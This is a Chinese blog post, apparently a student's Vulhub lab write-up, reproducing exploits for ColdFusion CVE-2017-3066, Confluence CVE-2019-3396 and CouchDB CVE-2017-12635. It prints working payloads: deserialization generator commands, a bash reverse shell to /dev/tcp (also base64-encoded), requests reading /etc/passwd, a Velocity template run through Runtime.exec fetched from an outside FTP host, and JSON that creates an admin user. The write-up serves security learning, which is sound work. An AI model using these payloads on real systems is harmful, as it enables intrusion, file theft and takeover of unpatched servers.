@@ -1,0 +1,1477 @@
+<!DOCTYPE HTML>
+<html lang="en">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="vulhub2, shiango">
+    <meta name="description" content="A Freshman">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>vulhub2 | shiango</title>
+    <link rel="icon" type="image/png" href="/favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="shiango" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">shiango</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>Index</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>Tags</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>Categories</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>Archives</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>About</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>Contact</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>Friends</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="Search" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">shiango</div>
+        <div class="logo-desc">
+            
+            A Freshman
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			Index
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			Tags
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			Categories
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			Archives
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			About
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			Contact
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			Friends
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/18.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">vulhub2</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                                <span class="chip bg-color">漏洞复现</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
+                    2022-07-19
+                </div>
+                
+
+                
+
+                
+
+                
+
+                
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <p>衔接上文</p>
+<h3 id="（1）2-coldfusion反序列化漏洞（CVE-2017-3066）"><a href="#（1）2-coldfusion反序列化漏洞（CVE-2017-3066）" class="headerlink" title="（1）2.coldfusion反序列化漏洞（CVE-2017-3066）"></a>（1）2.coldfusion<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>漏洞（CVE-2017-3066）</h3><h4 id="背景："><a href="#背景：" class="headerlink" title="背景："></a>背景：</h4><p>影响版本：</p>
+<p>Adobe ColdFusion (2016 release) Update 3及之前的版本</p>
+<p>ColdFusion 11 Update 11及之前的版本</p>
+<p>ColdFusion 10 Update 22及之前的版本</p>
+<h4 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h4><p>Adobe ColdFusion中存在<strong>java反序列化漏洞</strong>。攻击者可利用该漏洞在受影响应用程序的上下文中<strong>执行任意代码或造成拒绝服务</strong>。</p>
+<p>这个靶场一开始在复现环境时还以为是环境有问题，404，后来接着访问<a target="_blank" rel="noopener" href="http://x.x.x.x:8500/CFIDE/administrator/index.cfm%E5%8D%B3%E5%8F%AF">http://x.x.x.x:8500/CFIDE/administrator/index.cfm即可</a></p>
+<h4 id="具体利用如下："><a href="#具体利用如下：" class="headerlink" title="具体利用如下："></a>具体利用如下：</h4><p>利用</p>
+<p>（1）我们需要使用ColdFusionPwn工具来生成POC：</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar">ysoserial</a></li>
+<li><a target="_blank" rel="noopener" href="https://github.com/codewhitesec/ColdFusionPwn/releases/download/0.0.1/ColdFusionPwn-0.0.1-SNAPSHOT-all.jar">ColdFusionPwn</a></li>
+</ul>
+<p>生成POC命令如下<br>java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-2874a69f61-1.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 ‘touch /tmp/success’ poc.ser<br>会在两个jar包当前所在目录生成一个 poc.ser 文件</p>
+<p><img src="/images/image-20220719110412920.png" alt="image-20220719110412920"></p>
+<p>（2）访问 <a target="_blank" rel="noopener" href="http://your-ip:8500/flex2gateway/amf%EF%BC%8C%E5%B9%B6%E6%8A%93%E5%8C%85%E5%B0%86">http://your-ip:8500/flex2gateway/amf，并抓包将</a> Content-Type 改为application/x-amf，修改为 POST 协议,并添加刚刚生成的 poc.ser 文件</p>
+<p><a target="_blank" rel="noopener" href="http://your-ip:8500/flex2gateway/amf%EF%BC%8CContent-Type%E4%B8%BAapplication/x-amf%EF%BC%9A">http://your-ip:8500/flex2gateway/amf，Content-Type为application/x-amf：</a></p>
+<p>POST /flex2gateway/amf HTTP/1.1<br>Host: your-ip:8500<br>Accept-Encoding: gzip, deflate<br>Accept: <em>/</em><br>Accept-Language: en<br>User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)<br>Connection: close<br>Content-Type: application/x-amf<br>Content-Length: 2853</p>
+<p>由于编码问题，如果直接从Notepad++/Notepad里面复制粘贴为body部分，是不成功的，即使返回的状态码是200，<br> 右击选择Paste From File，上传poc.cer文件</p>
+<p>（3）通过docekrid进入容器，验证文件是否建立</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker ps  //查看容器的ID</span><br><span class="line"></span><br><span class="line">docker <span class="built_in">exec</span> -it ID /bin/bash</span><br><span class="line"><span class="built_in">cd</span> /tmp</span><br><span class="line">ls</span><br></pre></td></tr></table></figure>
+
+<p> Docker exec docker容器id -it /bin/bash（本机）</p>
+<p>出现success即为成功</p>
+<p>（4）反弹shell</p>
+<p>通过docekrid进入容器<br> 尝试反弹shell</p>
+<p>同时我们试一下，利用该漏洞反弹shell</p>
+<p>构造反弹命令</p>
+<p>bash -i &gt;&amp; /dev/tcp/X.X.X.X/7777 0&gt;&amp;1</p>
+<p>将其进行 base64 编码</p>
+<p>YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xOTIuOTkvNzc3NyAwPiYxIA==</p>
+<p>使用 ColdFusionPwn 工具再次生成 poc.ser</p>
+<p>java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-master-d367e379d9-1.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 ‘ bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45OC4xOTIuOTkvNzc3NyAwPiYxIA==}|{base64,-d}|{bash,-i} ‘ poc.ser</p>
+<p>再次上传 poc.ser即可在靶机上面监听到了。</p>
+<h3 id="（2）CVE-2019-3396-Confluence-RCE漏洞复现"><a href="#（2）CVE-2019-3396-Confluence-RCE漏洞复现" class="headerlink" title="（2）CVE-2019-3396 Confluence RCE漏洞复现"></a>（2）CVE-2019-3396 Confluence RCE漏洞复现</h3><p>参考博客：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/13755525.html">【Vulhub】CVE-2019-3396 Confluence RCE漏洞复现 - Zh1z3ven - 博客园 (cnblogs.com)</a></p>
+<h4 id="背景：-1"><a href="#背景：-1" class="headerlink" title="背景："></a>背景：</h4><p>Atlassian Confluence是企业广泛使用的wiki系统，是一种在网络上开放且可供多人协同创作的超文本系统）。它是一个知识管理的工具，通过它可以实现团队成员之间的协作和知识共享。<br>  Confluence 不是一个开源软件，非商业用途可以免费使用。<br>其使用简单，但它强大的编辑和站点管理特征能够帮助团队成员之间共享信息，文档协作，集体讨论；目前，Confluence被用于广泛地用于项目团队，开发团队，市场销售团队。<br>其<strong>6.14.2版本</strong>前存在一处<strong>未授权的目录穿越漏洞，通过该漏洞，攻击者可以读取任意文件，或利用Velocity模板注入执行任意命令</strong>。</p>
+<p> 在Widget连接器中的Confluence Server和Data Center中存在一个<strong>服务器端模板注入漏洞</strong>。  攻击者可以利用此问题在运行漏洞版本的Confluence Server或Data  Center的系统上实现服务器端模板注入，路径遍历和远程代码执行。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里靶场配置有改动。我们了解一下原理：</p>
+<p>（1）读取外部web.xml</p>
+<p>利用Bp进行抓包，注意Referer字段最好用自己抓的包的值，vulhub上提供的payload如下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line">Host: Your-ip:8090</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://Your-ip:8090/pages/resumedraft.action?draftId=786457&amp;draftShareId=056b55bc-fc4a-487b-b1e1-8f673f280c23&amp;</span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line">Content-Length: 176</span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;contentId&quot;</span>:<span class="string">&quot;786458&quot;</span>,<span class="string">&quot;macro&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;widget&quot;</span>,<span class="string">&quot;body&quot;</span>:<span class="string">&quot;&quot;</span>,<span class="string">&quot;params&quot;</span>:&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https://www.viddler.com/v/23464dc6&quot;</span>,<span class="string">&quot;width&quot;</span>:<span class="string">&quot;1000&quot;</span>,<span class="string">&quot;height&quot;</span>:<span class="string">&quot;1000&quot;</span>,<span class="string">&quot;_template&quot;</span>:<span class="string">&quot;../web.xml&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>（2）利用file协议读取本地任意文件</p>
+<p>6.12以前的Confluence没有限制文件读取的协议和路径，我们可以使用<code>file:///etc/passwd</code>来读取文件，也可以通过<code>https://...</code>来加载远程文件。该文件是一个Velocity模板，我们可以通过模板注入（SSTI）来执行任意命令：</p>
+<p><img src="/images/Confluence%20RCE1.png" alt="Confluence RCE1"></p>
+<p>payload：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 192.168.124.153:8090</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: en</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.227.128:8090/pages/resumedraft.action?draftId=65594&amp;draftShareId=4fd7bbb3-230b-480e-9360-e02b65c602ad</span><br><span class="line"></span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line">Content-Length: 167</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;contentId&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;macro&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;widget&quot;</span>,<span class="string">&quot;params&quot;</span>:&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https://www.viddler.com/v/test&quot;</span>,<span class="string">&quot;width&quot;</span>:<span class="string">&quot;1000&quot;</span>,<span class="string">&quot;height&quot;</span>:<span class="string">&quot;1000&quot;</span>,<span class="string">&quot;_template&quot;</span>:<span class="string">&quot;file:///etc/passwd&quot;</span>&#125;,<span class="string">&quot;body&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>wireshark来追踪http流量包也可以看到里面的内容</p>
+<p>（3）实现RCE excute command</p>
+<p>主要原理是根据读文件的思路，远程包含python搭建的ftp服务器上的.vm文件来创造执行命令的环境，进而实现RCE。</p>
+<p>python开启ftp</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install pyftpdlib</span><br><span class="line"></span><br><span class="line">python -m pyftpdlib -<span class="selector-tag">p</span>  <span class="number">8888</span></span><br></pre></td></tr></table></figure>
+
+<p>在开启ftp的当前目录下写入r.vm文件</p>
+<p>r.vm</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span> (<span class="variable">$exp</span>=<span class="string">&quot;exp&quot;</span>)</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span> (<span class="variable">$a</span>=<span class="variable">$exp</span>.getClass().forName(<span class="string">&quot;java.lang.Runtime&quot;</span>).getMethod(<span class="string">&quot;getRuntime&quot;</span>,null).invoke(null,null).<span class="built_in">exec</span>(<span class="variable">$command</span>))</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span> (<span class="variable">$input</span>=<span class="variable">$exp</span>.getClass().forName(<span class="string">&quot;java.lang.Process&quot;</span>).getMethod(<span class="string">&quot;getInputStream&quot;</span>).invoke(<span class="variable">$a</span>))</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span>(<span class="variable">$sc</span> = <span class="variable">$exp</span>.getClass().forName(<span class="string">&quot;java.util.Scanner&quot;</span>))</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span>(<span class="variable">$constructor</span> = <span class="variable">$sc</span>.getDeclaredConstructor(<span class="variable">$exp</span>.getClass().forName(<span class="string">&quot;java.io.InputStream&quot;</span>)))</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="built_in">set</span>(<span class="variable">$scan</span>=<span class="variable">$constructor</span>.newInstance(<span class="variable">$input</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>))</span></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="keyword">if</span>(<span class="variable">$scan</span>.hasNext())</span></span><br><span class="line">    $scan.next()</span><br><span class="line"><span class="meta">#</span><span class="bash">end</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="excute-ifconfig"><a href="#excute-ifconfig" class="headerlink" title="excute ifconfig"></a>excute ifconfig</h5><p>payload</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">POST /rest/tinymce/1/macro/preview HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: ip:8090</span><br><span class="line"></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"></span><br><span class="line">Accept: */*</span><br><span class="line"></span><br><span class="line">Accept-Language: en</span><br><span class="line"></span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"></span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">Referer: http://192.168.124.153:8090/pages/resumedraft.action?draftId=65594&amp;draftShareId=4fd7bbb3-230b-480e-9360-e02b65c602ad</span><br><span class="line"></span><br><span class="line">Content-Type: application/json; charset=utf-8</span><br><span class="line"></span><br><span class="line">Content-Length: 205</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#123;<span class="string">&quot;contentId&quot;</span>:<span class="string">&quot;1&quot;</span>,<span class="string">&quot;macro&quot;</span>:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;widget&quot;</span>,<span class="string">&quot;params&quot;</span>:&#123;<span class="string">&quot;url&quot;</span>:<span class="string">&quot;https://www.viddler.com/v/test&quot;</span>,<span class="string">&quot;width&quot;</span>:<span class="string">&quot;1000&quot;</span>,<span class="string">&quot;height&quot;</span>:<span class="string">&quot;1000&quot;</span>,<span class="string">&quot;_template&quot;</span>:<span class="string">&quot;ftp://192.168.124.141:8888/r.vm&quot;</span>,<span class="string">&quot;command&quot;</span>:<span class="string">&quot;ifconfig&quot;</span>&#125;,<span class="string">&quot;body&quot;</span>:<span class="string">&quot;&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20220719181019663.png" alt="image-20220719181019663"></p>
+<p>建议</p>
+<p>1、升级Confluence版本</p>
+<p>2、主动升级widgetconnector-3.1.3.jar 到 widgetconnector-3.1.4.jar</p>
+<h3 id="（3）couchdb"><a href="#（3）couchdb" class="headerlink" title="（3）couchdb"></a>（3）couchdb</h3><h4 id="1-cve-2017-12635"><a href="#1-cve-2017-12635" class="headerlink" title="1.cve-2017-12635"></a>1.cve-2017-12635</h4><h5 id="背景：-2"><a href="#背景：-2" class="headerlink" title="背景："></a>背景：</h5><p>Apache <strong>CouchDB</strong>是一个<strong>开源数据库</strong>，专注于易用性和成为”完全拥抱web的数据库”。它是一个使用<strong>JSON作为存储格式</strong>，<strong>JavaScript作为查询语言</strong>，<strong>MapReduce和HTTP作为API的NoSQL数据库</strong>。应用广泛，如BBC用在其动态内容展示平台，Credit Suisse用在其内部的商品部门的市场框架，Meebo，用在其社交平台（web和应用程序）。</p>
+<p>CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。漏洞可以让任意用户创建管理员，属于<strong>垂直权限绕过漏洞</strong>。</p>
+<h5 id="原理：垂直权限绕过"><a href="#原理：垂直权限绕过" class="headerlink" title="原理：垂直权限绕过"></a>原理：垂直权限绕过</h5><p>CVE-2017-12635垂直权限绕过漏洞来源于Erlang和JavaScript对于JSON的重复键解析存在差异性，下面是二者的存储形式：</p>
+<p>Erlang：</p>
+<p>jiffy:decode(‘{“a”:”1”, “a”:”2”}’).</p>
+<p>{[{&lt;&lt;”a”&gt;&gt;,&lt;&lt;”1”&gt;&gt;},{&lt;&lt;”a”&gt;&gt;,&lt;&lt;”2”&gt;&gt;}]}</p>
+<p>JavaScript:</p>
+<p>JSON.parse(‘{“a”:”1”, “a”: “2”}’);<br>{ a: ‘2’ }</p>
+<p>对于给定键，Erlang解析器会存储两个值，而JavaScript只会存储一个值。</p>
+<p>构造Payload（用于注册）：</p>
+<p>{<br>“type”: “user”,<br>“name”: “vuluser1”,<br>“roles”: [“_admin”],<br>“roles”:[],<br>“password”: “vulnerable”<br>}</p>
+<p>那么系统的安全检测部分（JavaScript编写）会取到第二个roles键，故判定为无害的注册请求，放行。当这份JSON到达系统实现身份验证和授权的部分（Erlang编写），由于解析组件jiffy的函数实现问题，getter函数会仅取第一个roles键，于是完成创建了一个管理员权限的用户。</p>
+<p>BurpSuite抓一下注册的包，注意PUT路径中的用户名、_id键，返回状态码201，创建成功。</p>
+<p>这个漏洞可以和12636联合起来利用，因此在这里就不重复了，下文一起利用。</p>
